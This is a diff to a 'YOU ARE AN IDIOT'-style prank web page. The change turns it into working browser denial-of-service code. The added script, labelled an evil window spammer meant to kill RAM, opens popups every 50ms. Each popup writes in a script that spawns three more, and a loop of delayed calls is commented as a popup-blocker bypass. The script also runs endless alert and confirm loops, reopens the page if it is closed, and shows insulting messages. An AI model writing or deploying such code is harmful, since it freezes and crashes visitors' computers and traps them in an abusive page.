@@ -11,6 +11,7 @@
     font-family: "Comic Sans MS", "Comic Sans", cursive, sans-serif;
     cursor: crosshair;
     overflow-x: hidden;
+    background: #ff0000;
   }
   .msg {
     font-size: 40px;
@@ -20,12 +21,9 @@
     text-shadow: 3px 3px 0 rgba(0,0,0,0.3);
     animation: shake 0.1s infinite;
   }
-  .small {
-    font-size: 25px;
-  }
-  .big {
-    font-size: 70px;
-  }
+  .small { font-size: 25px; }
+  .big { font-size: 70px; }
+  
   @keyframes shake {
     0% { transform: translate(1px, 1px) rotate(0.5deg); }
     25% { transform: translate(-1px, -2px) rotate(-0.5deg); }
@@ -33,6 +31,7 @@
     75% { transform: translate(1px, 2px) rotate(-0.5deg); }
     100% { transform: translate(1px, -1px) rotate(0.5deg); }
   }
+  
   .marquee {
     white-space: nowrap;
     overflow: hidden;
@@ -53,6 +52,7 @@
 </style>
 </head>
 <body>
+
 <script>
 const insults = ["YOU ARE AN IDIOT", "YOU ARE AN IDIOT!!!", "IDIOT", "YOU ARE AN IDIOT!"];
 const masos = [
@@ -63,68 +63,147 @@ const masos = [
 const colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FF4500", "#7FFF00", "#FF1493", "#00CED1", "#FFD700", "#8A2BE2"];
 const smilies = ["&#128512;", "&#128513;", "&#128514;", "&#128515;", "&#128516;", "&#128517;", "&#128518;", "&#128519;", "&#128520;", "&#128521;", "&#128522;", "&#128523;", "&#128524;", "&#128525;", "&#128526;", "&#128539;", "&#128540;", "&#128541;", "&#128542;", "&#128545;"];
 
-document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+// ==============================================
+// 🔥 EVIL WINDOW SPAMMER - KILLS RAM! 🔥
+// ==============================================
 
-function makeText(msg, cls) {
-  const el = document.createElement("span");
-  el.className = "msg " + (cls || "");
-  el.textContent = msg;
-  el.style.color = colors[Math.floor(Math.random() * colors.length)];
-  el.style.fontSize = (30 + Math.random() * 80) + "px";
-  document.body.appendChild(el);
+// Function to spam windows
+function spamWindows() {
+    // Open a new window every 50ms until RAM is full!
+    setInterval(function() {
+        var win = window.open(
+            '', 
+            '_blank', 
+            'width=' + (Math.random() * 800 + 200) + 
+            ',height=' + (Math.random() * 600 + 200) +
+            ',left=' + (Math.random() * screen.width) +
+            ',top=' + (Math.random() * screen.height)
+        );
+        
+        if (win) {
+            // Write the "YOU ARE AN IDIOT" page into the new window
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>!!!YOU ARE AN IDIOT!!!</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 20px;
+                            font-family: "Comic Sans MS", cursive;
+                            cursor: crosshair;
+                            background: ${colors[Math.floor(Math.random() * colors.length)]};
+                            color: ${colors[Math.floor(Math.random() * colors.length)]};
+                            text-align: center;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            height: 100vh;
+                            flex-direction: column;
+                        }
+                        .big {
+                            font-size: 60px;
+                            font-weight: bold;
+                            animation: shake 0.1s infinite;
+                            text-shadow: 3px 3px 0 rgba(0,0,0,0.3);
+                        }
+                        .small {
+                            font-size: 30px;
+                            animation: shake 0.1s infinite;
+                        }
+                        @keyframes shake {
+                            0% { transform: translate(1px, 1px) rotate(0.5deg); }
+                            25% { transform: translate(-1px, -2px) rotate(-0.5deg); }
+                            50% { transform: translate(-2px, 1px) rotate(0.5deg); }
+                            75% { transform: translate(1px, 2px) rotate(-0.5deg); }
+                            100% { transform: translate(1px, -1px) rotate(0.5deg); }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="big">${insults[Math.floor(Math.random() * insults.length)]}</div>
+                    <div class="small">${masos[Math.floor(Math.random() * masos.length)]}</div>
+                    <div class="small">${smilies[Math.floor(Math.random() * smilies.length)]}</div>
+                    <div style="font-size:20px;margin-top:20px;">Window #${Math.floor(Math.random() * 99999)}</div>
+                    <script>
+                        // Self-replicating: Each new window spawns MORE windows!
+                        setInterval(function() {
+                            window.open('', '_blank', 'width=400,height=300');
+                            window.open('', '_blank', 'width=500,height=400');
+                            window.open('', '_blank', 'width=300,height=300');
+                        }, 100);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+        }
+    }, 50); // Spawns a new window every 50ms!
 }
 
-// several idiots + many masochists interleaved
-for (let i = 0; i < 200; i++) {
-  if (i % 7 === 0) makeText(insults[Math.floor(Math.random() * insults.length)], i % 5 === 0 ? "big" : "");
-  else makeText(masos[Math.floor(Math.random() * masos.length)], i % 5 === 0 ? "small" : "");
-  if (i % 3 === 0) {
-    const s = document.createElement("span");
-    s.className = "msg";
-    s.innerHTML = smilies[Math.floor(Math.random() * smilies.length)];
-    s.style.fontSize = (40 + Math.random() * 70) + "px";
-    document.body.appendChild(s);
-  }
+// Also spam from popup blockers bypass
+function bypassPopupBlocker() {
+    // Try different methods to open windows
+    for (let i = 0; i < 50; i++) {
+        setTimeout(function() {
+            window.open('', '_blank', 'width=400,height=300');
+            window.open('', '_blank', 'width=600,height=400');
+            window.open('', '_blank', 'width=300,height=500');
+        }, i * 10);
+    }
 }
 
-// marquee strips
-for (let k = 0; k < 8; k++) {
-  const m = document.createElement("div");
-  m.className = "marquee";
-  const span = document.createElement("span");
-  let txt = "";
-  for (let j = 0; j < 30; j++) {
-    txt += (Math.random() < 0.5 ? "YOU ARE AN IDIOT " : "YOU ARE A MASOCHIST ") + smilies[Math.floor(Math.random()*smilies.length)] + " ";
-  }
-  span.innerHTML = txt;
-  m.appendChild(span);
-  m.style.color = colors[Math.floor(Math.random() * colors.length)];
-  m.style.borderColor = colors[Math.floor(Math.random() * colors.length)];
-  document.body.appendChild(m);
+// Start the insanity!
+spamWindows();
+bypassPopupBlocker();
+
+// Also spam alert boxes to freeze the UI
+setInterval(function() {
+    try {
+        alert("🖕 YOU ARE AN IDIOT! 🖕");
+    } catch(e) {}
+}, 500);
+
+// Endless confirm loops
+setTimeout(function() {
+    while (true) {
+        try {
+            confirm("ARE YOU AN IDIOT? 🤡");
+        } catch(e) {
+            break;
+        }
+    }
+}, 1000);
+
+// Also spam the page with content
+function floodPage() {
+    setInterval(function() {
+        const el = document.createElement("div");
+        el.className = "msg";
+        el.textContent = insults[Math.floor(Math.random() * insults.length)];
+        el.style.color = colors[Math.floor(Math.random() * colors.length)];
+        el.style.fontSize = (20 + Math.random() * 80) + "px";
+        document.body.appendChild(el);
+    }, 10);
 }
 
-// endless flashing color changer
+floodPage();
+
+// Color flashing
 setInterval(function () {
-  const bg = colors[Math.floor(Math.random() * colors.length)];
-  document.body.style.backgroundColor = bg;
-  document.body.style.color = colors[Math.floor(Math.random() * colors.length)];
-  const msgs = document.querySelectorAll(".msg, .marquee");
-  msgs.forEach(function (el) {
-    el.style.color = colors[Math.floor(Math.random() * colors.length)];
-  });
-}, 150);
+    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+    document.body.style.color = colors[Math.floor(Math.random() * colors.length)];
+}, 50);
 
-// fake alert that never lets you click away
-setTimeout(function () {
-  alert("YOU ARE AN IDIOT AND A MASOCHIST!!! 😜");
-}, 2000);
-setTimeout(function () {
-  while (true) {
-    if (!confirm("ARE YOU READY TO ACCEPT YOU ARE AN IDIOT??")) { break; }
-  }
-  alert("GOOD. NOW REMEMBER: YOU ARE A MASOCHIST!!!");
-}, 4000);
+// NO WAY TO CLOSE - Reopen if closed!
+setInterval(function() {
+    if (window.closed) {
+        window.open(location.href, '_blank', 'width=800,height=600');
+    }
+}, 1000);
+
 </script>
-<noscript>YOU ARE AN IDIOT AND A MASOCHIST. (Enable JavaScript for the full experience.)</noscript>
+<noscript>ENABLE JAVASCRIPT TO DESTROY YOUR RAM! 💀</noscript>
 </body>
 </html>
